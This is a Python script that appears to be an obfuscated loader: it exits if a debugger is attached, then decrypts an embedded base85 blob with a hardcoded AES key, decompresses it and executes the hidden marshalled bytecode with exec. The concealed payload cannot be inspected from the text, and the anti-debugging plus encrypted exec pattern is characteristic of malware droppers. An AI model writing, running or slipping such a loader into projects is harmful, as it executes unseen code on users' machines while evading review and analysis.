import sys
import os
import base64
import hashlib
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'\xc0\xa9y@\xa1\xd3\xf9\xd1l\xfe\x1f\xc0\x00\x9b\xe1\xd2\xa8\xaeu\x19\x035\xce\xc6\xe1\xc0\xa8n\x17\x032`'
_IV = b'\xaa\x91\x92\xea\xe0t\x12p*x\x8d9\x8e\xf3\xd2X'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except:
        return ""

def _main():
    try:
        _encrypted = 'SkbcIW)}J}!Id9IZFnPLYp-n2^{}(B!825+<|kBVSY0o8qm<Ldw&Z{71_dW0<P@$9xC|Fpu}4*2e8tJdMf34`sNB%;%QxDiSw{FQ-_TJu37(?1fzfp$;R-qM8Rjg?LL7XD=FW-=h&e<`B`jcqg7V4ZB=?EW(uNZM60<xEwr)>%-jESBSFPFOn$%BVo(d_2`a9j<L$^c(Fd*lh3gr?5(%JM7j7%a`K7`jIiShSmIg!aKcWtFK*=?GE`F&igci?G8a7;&2?x^!~bT4oqKwBf?k~6%B{63Zi3HJz&_@z&d<OY{&t{Qu$+|d$HW2G2_{5)+6Z^UR?UQO;-j_OBEf17X3w7`$6=YcJO77{74Sy+?X-(udMwA#6hoEtGHDorZlJDkGb`R;L;pP0;?N>a|_(2#=|L+x6Gbl^z8-zS2LV+8i2x$&?ZP0h?V?>R^{PQ+1Ae5e}giTxt|Yas>mWTSgOXCV^(w-?Trrj}WF1=|ic^nJYK#e66|Yg+9<0J^k&TJFC-76)>1L7BiN^5h(7fZLAzIHy}?5+10lw*bbAmYzA8V5?cRf=fEYPuRbM+8J_`-v-P@6MENJ!FUqPNl1VWBXJ4rl;8ieR;Jg@d=PR7N=*z)B`FB5bVrYu>_X^LGz&S;a9f-a@JFj}#asgHNYC=TkB(IQr9pjU0b(<rLbtanm8YZj1Dv$G>t)S8-Ti9bo0moj4|l+oC;}6F6lPE-@^VqjH<YKZU4qge6qqg)nDM5Z^D5_h8huw#`V!r_#sIoly~wx-<-~OWfI^b)wB!85DD8w^fAZ>vT+1Gga(dW(=f(M-U!v?NG6r^byR+@(Jb6!5g#)&uR-b>5pDE$VKw@a<AYq~%vzGUP)z5QGq-Qy3^FETQ!IrvJc4_k3Q#KMxG?z=_67*wiF$_;A-I+?|;*m9-uA#jN4P^2a4HFSQdG{N|@`K3696w7Tlhsuyn`2cAG%;w4grmfMg3EnI4Y>;d%@P!Y`YDt&Z&#-F+<TZ8!D5=nTqsqH'
        
        # Decryption steps
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        exec(marshal.loads(decompressed_data), {
            **globals(),
            '__name__': '__main__',
            '__builtins__': __builtins__,
            '_decrypt_str': _decrypt_str
        })
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    _main()
        
